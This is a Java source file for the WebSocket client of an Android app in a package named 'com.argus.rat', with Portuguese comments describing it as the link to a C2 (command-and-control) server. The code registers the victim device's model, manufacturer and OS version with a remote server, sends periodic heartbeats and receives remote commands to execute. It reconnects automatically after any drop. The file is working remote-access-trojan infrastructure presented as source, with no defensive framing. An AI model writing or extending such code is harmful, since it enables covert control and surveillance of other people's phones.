package com.argus.rat;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import com.google.gson.Gson;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import okhttp3.*;
import java.util.concurrent.TimeUnit;

/**
 * Cliente WebSocket para comunicação em tempo real com servidor C2
 */
public class WebSocketClient {
    
    private static final String TAG = "WebSocketClient";
    
    // URL do WebSocket C2 (será configurado)
    private static String WS_SERVER_URL = "ws://192.168.1.100:5000/socket.io/?transport=websocket";
    
    private static final int RECONNECT_DELAY_MS = 5000; // 5 segundos
    private static final int HEARTBEAT_INTERVAL_MS = 30000; // 30 segundos
    
    private final Context context;
    private final Gson gson;
    private final Handler handler;
    
    private OkHttpClient okHttpClient;
    private WebSocket webSocket;
    private boolean isConnected = false;
    private boolean shouldReconnect = true;
    
    private WebSocketListener listener;
    private String deviceId;
    
    // Singleton
    private static WebSocketClient instance;
    
    WebSocketClient(Context context) {
        this.context = context.getApplicationContext();
        this.gson = new Gson();
        this.handler = new Handler(Looper.getMainLooper());
        
        // Configurar OkHttpClient para WebSocket
        this.okHttpClient = new OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(0, TimeUnit.MILLISECONDS) // Sem timeout para WebSocket
                .retryOnConnectionFailure(true)
                .build();
    }
    
    public static synchronized WebSocketClient getInstance(Context context) {
        if (instance == null) {
            instance = new WebSocketClient(context);
        }
        return instance;
    }
    
    /**
     * Define URL do servidor WebSocket
     */
    public static void setServerUrl(String url) {
        WS_SERVER_URL = url;
        Log.i(TAG, "WebSocket URL configurado: " + url);
    }
    
    /**
     * Define listener de eventos
     */
    public void setListener(WebSocketListener listener) {
        this.listener = listener;
    }
    
    /**
     * Conecta ao servidor WebSocket
     */
    public void connect(String deviceId) {
        this.deviceId = deviceId;
        
        if (isConnected) {
            Log.w(TAG, "Já conectado ao WebSocket");
            return;
        }
        
        Request request = new Request.Builder()
                .url(WS_SERVER_URL)
                .build();
        
        webSocket = okHttpClient.newWebSocket(request, new okhttp3.WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                isConnected = true;
                Log.i(TAG, "WebSocket conectado");
                
                // Enviar registro de dispositivo
                sendDeviceRegister();
                
                // Iniciar heartbeat
                startHeartbeat();
                
                if (listener != null) {
                    listener.onConnected();
                }
            }
            
            @Override
            public void onMessage(WebSocket webSocket, String text) {
                Log.d(TAG, "Mensagem recebida: " + text);
                handleMessage(text);
            }
            
            @Override
            public void onClosing(WebSocket webSocket, int code, String reason) {
                Log.w(TAG, "WebSocket fechando: " + reason);
                isConnected = false;
            }
            
            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                Log.w(TAG, "WebSocket fechado: " + reason);
                isConnected = false;
                
                if (listener != null) {
                    listener.onDisconnected();
                }
                
                // Tentar reconectar
                if (shouldReconnect) {
                    scheduleReconnect();
                }
            }
            
            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                Log.e(TAG, "Erro no WebSocket: " + t.getMessage());
                isConnected = false;
                
                if (listener != null) {
                    listener.onError(t);
                }
                
                // Tentar reconectar
                if (shouldReconnect) {
                    scheduleReconnect();
                }
            }
        });
    }
    
    /**
     * Desconecta do WebSocket
     */
    public void disconnect() {
        shouldReconnect = false;
        if (webSocket != null) {
            webSocket.close(1000, "Desconectado pelo cliente");
            webSocket = null;
        }
        isConnected = false;
        stopHeartbeat();
        Log.i(TAG, "WebSocket desconectado");
    }
    
    /**
     * Envia mensagem pelo WebSocket
     */
    public void sendMessage(String event, JsonObject data) {
        if (!isConnected || webSocket == null) {
            Log.w(TAG, "WebSocket não conectado, não é possível enviar mensagem");
            return;
        }
        
        JsonObject message = new JsonObject();
        message.addProperty("event", event);
        message.add("data", data);
        
        String jsonMessage = gson.toJson(message);
        webSocket.send(jsonMessage);
        Log.d(TAG, "Mensagem enviada: " + jsonMessage);
    }
    
    /**
     * Envia registro de dispositivo
     */
    private void sendDeviceRegister() {
        JsonObject deviceInfo = new JsonObject();
        deviceInfo.addProperty("device_id", deviceId);
        deviceInfo.addProperty("device_name", android.os.Build.MODEL);
        deviceInfo.addProperty("model", android.os.Build.MODEL);
        deviceInfo.addProperty("manufacturer", android.os.Build.MANUFACTURER);
        deviceInfo.addProperty("android_version", android.os.Build.VERSION.RELEASE);
        deviceInfo.addProperty("api_level", android.os.Build.VERSION.SDK_INT);
        
        sendMessage("device_register", deviceInfo);
    }
    
    /**
     * Manipula mensagens recebidas
     */
    private void handleMessage(String text) {
        try {
            JsonObject message = JsonParser.parseString(text).getAsJsonObject();
            String event = message.has("event") ? message.get("event").getAsString() : "";
            JsonObject data = message.has("data") ? message.getAsJsonObject("data") : new JsonObject();
            
            switch (event) {
                case "new_command":
                    handleNewCommand(data);
                    break;
                    
                case "device_registered":
                    Log.i(TAG, "Dispositivo registrado no servidor");
                    break;
                    
                case "command_updated":
                    handleCommandUpdate(data);
                    break;
                    
                case "connection_status":
                    Log.i(TAG, "Status de conexão: " + data.toString());
                    break;
                    
                case "ping":
                    sendPong();
                    break;
                    
                default:
                    Log.d(TAG, "Evento desconhecido: " + event);
                    if (listener != null) {
                        listener.onMessageReceived(event, data);
                    }
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar mensagem: " + e.getMessage());
        }
    }
    
    /**
     * Manipula novo comando recebido
     */
    private void handleNewCommand(JsonObject data) {
        String commandId = data.has("command_id") ? data.get("command_id").getAsString() : "";
        String commandType = data.has("command_type") ? data.get("command_type").getAsString() : "";
        
        Log.i(TAG, "Novo comando recebido: " + commandType + " [" + commandId + "]");
        
        if (listener != null) {
            listener.onCommandReceived(commandId, commandType, data);
        }
    }
    
    /**
     * Manipula atualização de comando
     */
    private void handleCommandUpdate(JsonObject data) {
        String commandId = data.has("command_id") ? data.get("command_id").getAsString() : "";
        String status = data.has("status") ? data.get("status").getAsString() : "";
        
        Log.d(TAG, "Comando atualizado: " + commandId + " - " + status);
        
        if (listener != null) {
            listener.onCommandUpdated(commandId, status);
        }
    }
    
    /**
     * Envia heartbeat
     */
    void sendHeartbeat() {
        JsonObject heartbeat = new JsonObject();
        heartbeat.addProperty("device_id", deviceId);
        heartbeat.addProperty("timestamp", System.currentTimeMillis());
        
        // Adicionar informações adicionais
        JsonObject additionalInfo = new JsonObject();
        // Adicionar bateria, localização, etc. se disponível
        heartbeat.add("additional_info", additionalInfo);
        
        sendMessage("device_heartbeat", heartbeat);
        Log.d(TAG, "Heartbeat enviado");
    }
    
    /**
     * Envia pong em resposta ao ping
     */
    private void sendPong() {
        JsonObject pong = new JsonObject();
        pong.addProperty("timestamp", System.currentTimeMillis());
        sendMessage("pong", pong);
    }
    
    /**
     * Inicia heartbeat periódico
     */
    private void startHeartbeat() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isConnected) {
                    sendHeartbeat();
                    handler.postDelayed(this, HEARTBEAT_INTERVAL_MS);
                }
            }
        }, HEARTBEAT_INTERVAL_MS);
    }
    
    /**
     * Para heartbeat
     */
    private void stopHeartbeat() {
        handler.removeCallbacksAndMessages(null);
    }
    
    /**
     * Agenda reconexão
     */
    private void scheduleReconnect() {
        Log.i(TAG, "Agendando reconexão em " + (RECONNECT_DELAY_MS / 1000) + " segundos...");
        
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isConnected && shouldReconnect) {
                    Log.i(TAG, "Tentando reconectar...");
                    connect(deviceId);
                }
            }
        }, RECONNECT_DELAY_MS);
    }
    
    /**
     * Verifica se está conectado
     */
    public boolean isConnected() {
        return isConnected;
    }
    
    /**
     * Interface de listener para eventos WebSocket
     */
    public interface WebSocketListener {
        void onConnected();
        void onDisconnected();
        void onError(Throwable error);
        void onCommandReceived(String commandId, String commandType, JsonObject data);
        void onCommandUpdated(String commandId, String status);
        void onMessageReceived(String event, JsonObject data);
    }
}




